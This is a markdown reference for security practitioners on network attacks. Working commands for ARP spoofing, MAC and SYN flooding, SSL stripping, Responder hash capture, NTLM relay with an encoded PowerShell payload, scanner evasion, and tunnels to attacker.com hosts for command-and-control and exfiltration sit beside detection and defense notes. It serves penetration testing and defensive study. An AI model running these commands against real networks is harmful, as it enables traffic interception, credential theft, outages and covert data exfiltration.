# Network Attacks Reference

> **Audience**: Security practitioners — penetration testers and defenders. This reference covers how network attacks work mechanically so defenders can detect and prevent them.

---

## Table of Contents

- [Layer 2 Attacks](#layer-2-attacks)
  - [ARP Poisoning / ARP Spoofing](#arp-poisoning--arp-spoofing)
  - [MAC Flooding](#mac-flooding)
  - [VLAN Hopping](#vlan-hopping)
  - [STP Attacks (Spanning Tree)](#stp-attacks-spanning-tree)
  - [802.1X Bypass](#8021x-bypass)
- [Man-in-the-Middle (MITM) Attacks](#man-in-the-middle-mitm-attacks)
  - [SSL Stripping](#ssl-stripping)
  - [Bettercap MITM Framework](#bettercap-mitm-framework)
  - [LLMNR/NBT-NS Poisoning (Responder)](#llmnrnbt-ns-poisoning-responder)
- [Network Scanning and Reconnaissance](#network-scanning-and-reconnaissance)
  - [Nmap Techniques](#nmap-techniques)
  - [Masscan](#masscan-fast-internet-scale-scanning)
- [Network Pivoting and Tunneling](#network-pivoting-and-tunneling)
  - [SSH Tunneling for Pivoting](#ssh-tunneling-for-pivoting)
  - [Chisel (HTTP/WebSocket Tunnel)](#chisel-httpwebsocket-tunnel)
  - [Ligolo-ng (Modern L3 Pivot)](#ligolo-ng-modern-l3-pivot)
  - [DNS Tunneling](#dns-tunneling-c2--data-exfil)
  - [ICMP Tunneling](#icmp-tunneling)
- [Firewall Evasion Techniques](#firewall-evasion-techniques)
- [Network Exploitation Frameworks](#network-exploitation-frameworks)
  - [Scapy — Packet Crafting](#scapy--packet-crafting)
  - [Metasploit Network Modules](#metasploit-network-modules)
- [Network Traffic Capture and Analysis](#network-traffic-capture-and-analysis)
  - [tcpdump Reference](#tcpdump-reference)
  - [Wireshark Display Filters](#wireshark-display-filters-quick-reference)
- [Network Detection Reference](#network-detection-reference)

---

## Layer 2 Attacks

### ARP Poisoning / ARP Spoofing

**Mechanism**: Send unsolicited ARP replies to poison caches. Victim maps attacker MAC to gateway IP — all traffic routes through attacker.

**Tools and commands**:

```bash
# Enable IP forwarding (for MITM, not DoS)
echo 1 > /proc/sys/net/ipv4/ip_forward

# arpspoof (dsniff suite)
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1   # Poison victim's cache
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100   # Poison gateway's cache (bidirectional)

# bettercap (modern, feature-rich)
bettercap -iface eth0
# In bettercap:
net.probe on
arp.spoof.targets 192.168.1.100
arp.spoof on
net.sniff on

# scapy (custom ARP poison)
from scapy.all import *
send(ARP(op=2, pdst="192.168.1.100", psrc="192.168.1.1", hwdst="ff:ff:ff:ff:ff:ff"), count=5)
```

**Detection**:
- ARP cache inspection: `arp -a` — duplicate IPs with different MACs
- arpwatch: monitors ARP table, alerts on changes
- DAI (Dynamic ARP Inspection) on switches: validates ARP packets against DHCP snooping binding table
- SIEM: alert on ARP reply rate > threshold per host
- Windows Event ID 4771 (ARP cache updated) is not natively logged — requires Sysmon or EDR

**Defensive controls**: DAI, DHCP snooping, static ARP entries for critical hosts (gateway), private VLANs

---

### MAC Flooding

**Mechanism**: Flood switch CAM table with fake MAC addresses — CAM table full — switch enters "fail-open" mode (broadcasts all frames) — attacker sees all traffic.

```bash
macof -i eth0       # dsniff macof tool — generates ~150,000 entries/min

# Scapy MAC flood
from scapy.all import *
while True:
    sendp(Ether(src=RandMAC(), dst=RandMAC())/IP(src=RandIP(), dst=RandIP()), iface="eth0")
```

**Detection**: Excessive MAC addresses per port, CAM table exhaustion alerts in switch SNMP traps

**Defense**: Port security (limit MAC addresses per port), 802.1X, sticky MAC addresses

---

### VLAN Hopping

**Method 1 — Switch Spoofing**:
Negotiate trunk with switch via DTP — access all VLANs

```bash
yersinia -I        # Interactive mode
# Select DTP -> enable trunk attack
```

**Method 2 — Double Tagging**:
Send 802.1Q frame with outer tag = native VLAN (stripped at first switch) + inner tag = target VLAN

```python
from scapy.all import *
frame = Ether(dst="target_mac")/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst="10.20.1.1")/TCP(dport=80)
sendp(frame, iface="eth0")
```

**Detection**: DTP frames from access ports, trunk negotiation on non-uplink ports

**Defense**: Disable DTP (`switchport nonegotiate`), change native VLAN to unused VLAN 999, explicit native VLAN tagging

---

### STP Attacks (Spanning Tree)

**Root Bridge Injection**: Send superior BPDU — become root — all traffic routes through attacker

```bash
yersinia -G                   # GUI mode
# Select STP -> Claiming Root Role
```

**Detection**: BPDU from access ports, root bridge change events (SNMP trap)

**Defense**: BPDU Guard on access ports, Root Guard on uplink ports, STP dispute mechanism (RSTP)

---

### 802.1X Bypass

**Identity spoofing**: Clone a MAC address that passes MAB (MAC Authentication Bypass)

```bash
macchanger -m AA:BB:CC:DD:EE:FF eth0    # Change MAC to authorized device
```

**Auth timeout bypass**: Non-802.1X-capable devices use MAB — spoof MAC

**RADIUS Spoofing**: Fake RADIUS responses (requires access to management network)

**Defense**: 802.1X + MAB with device certificate requirement (EAP-TLS), profiling (ISE fingerprinting), behavioral anomaly detection

---

## Man-in-the-Middle (MITM) Attacks

### SSL Stripping

**Mechanism**: Intercept HTTPS — serve HTTP to victim, HTTPS to server. sslstrip rewrites HTTPS links to HTTP.

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Redirect port 80 traffic to sslstrip
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Run sslstrip
sslstrip -l 8080 -a -w sslstrip.log

# ARP poison to intercept traffic
arpspoof -i eth0 -t victim gateway
```

**Detection**: HSTS policy prevents SSL strip for previously-visited sites. Mixed content warnings. Proxy indicators in HTTP headers.

**Defense**: HSTS (Strict-Transport-Security: max-age=31536000; includeSubDomains; preload), HSTS Preload list (hstspreload.org), Certificate Transparency monitoring

---

### Bettercap MITM Framework

```bash
# Full MITM setup with bettercap
bettercap -iface eth0 -eval "net.probe on; arp.spoof on; http.proxy on; https.proxy on; net.sniff on"

# Bettercap caplets (automated attack scripts)
bettercap -caplet /usr/share/bettercap/caplets/http-req-dump.cap

# DNS spoofing via bettercap
dns.spoof.domains target.com
dns.spoof.address 192.168.1.50
dns.spoof on
```

---

### LLMNR/NBT-NS Poisoning (Responder)

**Mechanism**: Windows falls back to LLMNR/NetBIOS when DNS fails — attacker responds with own IP — captures NTLM hashes

```bash
# Responder — captures hashes from poisoning
responder -I eth0 -wrf

# Analyze captured hashes
cat /var/log/responder/Responder-Session.log

# Crack NTLMv2 with hashcat
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# Relay instead of crack (ntlmrelayx)
# Disable SMB and HTTP servers in Responder.conf to avoid hash capture
python3 ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -enc BASE64PAYLOAD"
```

**Detection**: Event ID 4776 (NTLM auth attempt), anomalous NTLM auth sources, LLMNR/NBT-NS traffic on network (these should not exist if DNS is working properly)

**Defense**:
- Disable LLMNR via GPO: Computer Configuration > Administrative Templates > Network > DNS Client > Turn off multicast name resolution = Enabled
- Disable NBT-NS: Network adapter > WINS > Disable NetBIOS
- Require SMB signing

---

## Network Scanning and Reconnaissance

### Nmap Techniques

```bash
# Host discovery (no port scan)
nmap -sn 192.168.1.0/24           # Ping sweep
nmap -sn --send-ip 192.168.1.0/24 # Bypass ARP (use IP)
nmap -sL 192.168.1.0/24           # List targets (DNS only)

# Port scanning techniques
nmap -sS target               # SYN scan (default, needs root)
nmap -sT target               # TCP connect (no root needed)
nmap -sU -p 53,161,500 target # UDP scan
nmap -sN target               # NULL scan (FIN=0, SYN=0, etc.)
nmap -sF target               # FIN scan
nmap -sX target               # Xmas scan (FIN+PSH+URG)
nmap -sA target               # ACK scan (map firewall rules)
nmap -sO target               # IP protocol scan

# Service/OS detection
nmap -sV -O --version-intensity 5 target
nmap -sV --version-all target      # Try all probes

# NSE Scripts
nmap --script=default target       # Default scripts
nmap --script=smb-vuln* target     # SMB vulnerabilities
nmap --script=http-enum target     # Web enumeration
nmap --script=ssl-enum-ciphers target  # SSL/TLS analysis
nmap --script=vuln target          # All vuln scripts

# Evasion techniques
nmap -D RND:10 target              # Decoy scan (10 random decoys)
nmap -f target                     # Fragment packets (8 bytes)
nmap --mtu 24 target               # Custom MTU fragmentation
nmap -sS --scan-delay 500ms target # Slow scan to avoid IDS
nmap --data-length 25 target       # Append random data
nmap --source-port 53 target       # Spoof source port (bypass FW)

# Output formats
nmap -oA scan_results target       # All formats (normal/XML/greppable)
nmap -oX scan.xml target | xsltproc - > scan.html  # HTML report
```

---

### Masscan (Fast Internet-Scale Scanning)

```bash
masscan -p0-65535 192.168.1.0/24 --rate=10000 -oJ results.json
masscan -p80,443 0.0.0.0/0 --rate=100000 --exclude 255.255.255.255
```

**Detection**: High connection rate from a single source, incomplete TCP handshakes, scan signature in IDS (Snort/Suricata rules)

**Defense**: Network IDS/IPS, rate limiting at firewall/router, honeypot ports for early warning

---

## Network Pivoting and Tunneling

### SSH Tunneling for Pivoting

```bash
# Local port forward — access internal_server:3389 via localhost:13389
ssh -L 13389:10.0.0.50:3389 jump@pivot.host

# Remote port forward — expose attacker's server through compromised host
ssh -R 8080:localhost:80 jump@pivot.host

# Dynamic SOCKS proxy — route all traffic through compromised host
ssh -D 1080 jump@pivot.host
# Use with proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -p 22,80,443 10.0.0.0/24

# Multi-hop pivot (jump through multiple hosts)
ssh -J jump1.host,jump2.host final.target
```

**Detection**: Long-lived SSH sessions, unusual source IPs, SSH connections to unusual internal hosts

**Defense**: Bastion host with MFA, restrict SSH between internal segments, alerting on SSH to new hosts

---

### Chisel (HTTP/WebSocket Tunnel)

```bash
# Server (attacker controlled)
chisel server -p 8080 --reverse

# Client (on compromised host in target network)
chisel client attacker.com:8080 R:socks           # SOCKS proxy via reverse
chisel client attacker.com:8080 R:1234:10.0.0.1:3389  # Specific port forward
```

**Detection**: Long-lived HTTP/WebSocket connections, non-browser User-Agent strings on port 80/443, unusual data volume over HTTP

---

### Ligolo-ng (Modern L3 Pivot)

```bash
# Proxy server (attacker)
./proxy -selfcert -laddr 0.0.0.0:11601

# Agent (compromised host)
./agent -connect attacker.com:11601 -ignore-cert

# In ligolo-ng console: add route to internal network
session
start
listener add --addr 0.0.0.0:1234 --to 10.0.0.1:3389
```

**Detection**: TLS connections on non-standard ports, routing anomalies from endpoint hosts

---

### DNS Tunneling (C2 / Data Exfil)

```bash
# Server (needs authoritative DNS for tunnel.attacker.com)
iodined -f -c -P password 10.0.0.1 tunnel.attacker.com

# Client (on compromised host)
iodine -f -P password tunnel.attacker.com
# Creates tun0 interface with 10.0.0.2 — can now route over DNS

# dnscat2 C2
# Server
ruby dnscat2.rb --dns domain=tunnel.attacker.com
# Client
./dnscat2 --dns domain=tunnel.attacker.com
```

**Detection**: High DNS query rate, long subdomain names (>50 chars), NULL/TXT record types in high volume, queries to a single domain from a single host

**Defense**: DNS filtering (Cisco Umbrella), DNS response policies, restrict DNS to corporate resolvers only

---

### ICMP Tunneling

```bash
# ptunnel (ICMP tunnel)
ptunnel-ng -p proxy.attacker.com -lp 8080 -da 10.0.0.1 -dp 22
```

**Detection**: ICMP payload >64 bytes, ICMP type 8/0 with unusual payload patterns, high ICMP volume

**Defense**: Block outbound ICMP at perimeter, alert on ICMP payload size anomalies

---

## Firewall Evasion Techniques

### Firewall Rules Mapping

```bash
# ACK scan to map stateful firewall rules
nmap -sA target
# Unfiltered = rule allows ACK (stateful sees as established)
# Filtered = blocked even for ACK packets

# Window scan (RST response analysis)
nmap -sW target

# Source port manipulation (bypass rules allowing DNS/HTTP out)
nmap --source-port 53 target       # Pretend to be DNS response
nmap --source-port 80 target       # Pretend to be HTTP response

# Fragmentation to bypass IDS
nmap -f --mtu 8 target
fragroute target                   # More complex fragmentation attacks
```

### Application Layer Evasion

```bash
# TLS traffic interleaving
# Use HTTPS port 443 for non-HTTPS C2 (Cobalt Strike default)
# Domain fronting: CDN routes to attacker despite allowed domain in SNI

# HTTP port 80 C2 mimicking normal traffic
# User-Agent: Mozilla/5.0 matching legitimate browser
# Beaconing interval with jitter to avoid pattern detection
```

**Detection**: Protocol anomalies on standard ports, JA3/JA3S TLS fingerprinting, unusual User-Agent strings, beaconing patterns (periodic outbound connections)

**Defense**: SSL inspection, deep packet inspection, Next-Gen Firewall with App-ID, JA3 fingerprint blocklists

---

## Network Exploitation Frameworks

### Scapy — Packet Crafting

```python
from scapy.all import *

# Custom TCP SYN packet
pkt = IP(dst="192.168.1.1")/TCP(dport=80, flags="S")
resp = sr1(pkt, timeout=2)
if resp and resp[TCP].flags == "SA":
    print("Port open")

# Send malformed packet (IDS testing)
pkt = IP(dst="192.168.1.1", frag=1, id=1234)/TCP(dport=80)/Raw("X"*100)
send(pkt)

# TCP SYN flood
send(IP(dst="target")/TCP(dport=80, flags="S", seq=RandInt()), count=10000, inter=0)

# ARP request sweep
ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"), timeout=2)
for sent, received in ans:
    print(f"{received.psrc} - {received.hwsrc}")

# Custom ICMP probe
pkt = IP(dst="192.168.1.1")/ICMP(type=8)/Raw(b"A"*64)
resp = sr1(pkt, timeout=2)

# UDP probe
pkt = IP(dst="192.168.1.1")/UDP(dport=161)/Raw(b"\x30\x26\x02\x01\x00")  # SNMP GetRequest
sr1(pkt, timeout=2)
```

---

### Metasploit Network Modules

```bash
# Port scanner
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443,445,3389,8080
run

# SMB version scan
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# SNMP community string enumeration
use auxiliary/scanner/snmp/snmp_enumusers
set RHOSTS 192.168.1.0/24
set COMMUNITY public
run

# Route through session (pivoting)
route add 10.0.0.0/24 SESSION_ID
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
run

# ARP sweep
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS 192.168.1.0/24
run
```

---

## Network Traffic Capture and Analysis

### tcpdump Reference

```bash
# Capture on interface
tcpdump -i eth0 -n -v

# Filters
tcpdump 'host 192.168.1.100'                    # Specific host
tcpdump 'port 443'                              # Specific port
tcpdump 'tcp and not port 22'                   # TCP, exclude SSH
tcpdump 'src net 192.168.1.0/24'               # Source subnet
tcpdump 'icmp or arp'                           # ICMP or ARP
tcpdump 'tcp[tcpflags] & tcp-syn != 0'         # SYN packets
tcpdump 'tcp[tcpflags] == tcp-syn'              # ONLY SYN
tcpdump 'tcp[13] & 0x03 != 0'                  # FIN or SYN set

# Save and read
tcpdump -w capture.pcap -i eth0 -G 3600 -W 24  # Rotate hourly, keep 24h
tcpdump -r capture.pcap                          # Read from file

# Extract HTTP traffic
tcpdump -A -n 'tcp port 80' | grep -E 'Host:|GET|POST'
```

---

### Wireshark Display Filters (Quick Reference)

```
ip.addr == 192.168.1.100              # All traffic to/from IP
ip.src == 10.0.0.0/24                # From subnet
tcp.port == 443                       # TLS traffic
tcp.flags.syn == 1 && tcp.flags.ack == 0   # SYN scans
dns.qry.name contains "attacker.com"  # DNS queries
http.request.method == "POST"         # HTTP POST
ssl.handshake.type == 1               # TLS Client Hello
frame contains "password"             # Content search (unencrypted)
!(ip.addr == 192.168.1.0/24)         # External traffic only
tcp.analysis.retransmission           # Retransmissions (network issues)
```

---

## Network Detection Reference

### Key Detection Points by Attack Type

| Attack | Detection Method | SIEM Query Hint |
|---|---|---|
| ARP Poisoning | ARP table anomalies, DAI violations | Duplicate IP in ARP, MAC changes |
| LLMNR/NBNS Poisoning | LLMNR traffic present, NTLM auth from unexpected source | Event 4776 from unusual host |
| MITM | TLS cert changes, HSTS violations, unusual latency | Cert fingerprint change detection |
| DNS Tunneling | High query rate, long labels, unusual record types | DNS query count > 100/min per client |
| Port Scanning | Many connection attempts, many destination IPs | >50 unique ports/min per source |
| SYN Flood | High SYN count, incomplete connections | TCP SYN:SYN-ACK ratio |
| VLAN Hopping | DTP frames on access ports, trunk negotiation | Switch SNMP/syslog |
| Pivot/Tunneling | Unusual outbound protocols, SOCKS traffic | Non-standard protocol on standard port |
| SMB Brute Force | Event 4625 spike on SMB port | >5 failed auth per minute per user |
| MAC Flooding | CAM table exhaustion, SNMP switch traps | Excessive unique MACs per port |
| ICMP Tunneling | ICMP payload size anomalies, high ICMP rate | ICMP payload > 64 bytes |
| STP Attack | BPDU from access ports, root bridge change | Switch SNMP topology change trap |

### MITRE ATT&CK Network Technique Mappings

| Technique ID | Name | Related Attacks in This Reference |
|---|---|---|
| T1557 | Adversary-in-the-Middle | ARP Poisoning, SSL Stripping, LLMNR Poisoning |
| T1046 | Network Service Scanning | Nmap, Masscan, Metasploit scanners |
| T1571 | Non-Standard Port | C2 over alternate ports, firewall evasion |
| T1572 | Protocol Tunneling | DNS Tunneling, ICMP Tunneling, Chisel, Ligolo |
| T1090 | Proxy | SOCKS proxies, SSH dynamic forwarding |
| T1040 | Network Sniffing | tcpdump, Wireshark, bettercap sniff |
| T1595 | Active Scanning | Nmap host discovery, Masscan |
| T1110 | Brute Force | SMB brute force (via Metasploit) |
| T1187 | Forced Authentication | LLMNR/NBT-NS Poisoning with Responder |
| T1021.002 | Remote Services: SMB | NTLM relay, lateral movement via SMB |

---

*See also: [Privilege Escalation Reference](PRIVESC_REFERENCE.md) | [Cloud Attack Reference](CLOUD_ATTACK_REFERENCE.md) | [Detection Rules Reference](DETECTION_RULES_REFERENCE.md) | [Wireless Security Reference](WIRELESS_SECURITY_REFERENCE.md)*
